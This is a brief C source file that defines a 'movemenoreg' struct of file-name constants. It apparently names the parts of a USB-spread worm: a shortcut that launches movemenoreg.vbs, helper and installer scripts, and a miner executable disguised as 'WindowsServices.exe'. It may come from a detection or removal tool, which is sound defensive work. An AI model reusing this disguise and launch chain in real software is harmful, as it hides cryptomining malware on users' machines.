/*
 * MIT License
 *
 * Copyright (c) 2025 Andrea Michael M. Molino
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
*/

/*Module struct*/
typedef struct
{
    const WCHAR mmr_lnk_argument[47];
    const WCHAR mmr_vbs_helper[11];
    const WCHAR mmr_lnk_helper[12];
    const WCHAR mmr_vbs_installer[14];
    const WCHAR mmr_vbs_main[16];
    const WCHAR mmr_exe_miner[20];
    const WCHAR mmr_folder[16];
    const WCHAR mmr_process[12];

} movemenoreg_t;

movemenoreg_t movemenoreg = {
    .mmr_lnk_argument  = L"/C .\\WindowsServices\\movemenoreg.vbs",
    .mmr_vbs_helper    = L"helper.vbs",
    .mmr_lnk_helper    = L"helper.lnk",
    .mmr_vbs_installer = L"installer.vbs",
    .mmr_vbs_main      = L"movemenoreg.vbs",
    .mmr_exe_miner     = L"WindowsServices.exe",
    .mmr_folder        = L"WindowsServices",
    .mmr_process       = L"wscript.exe"
};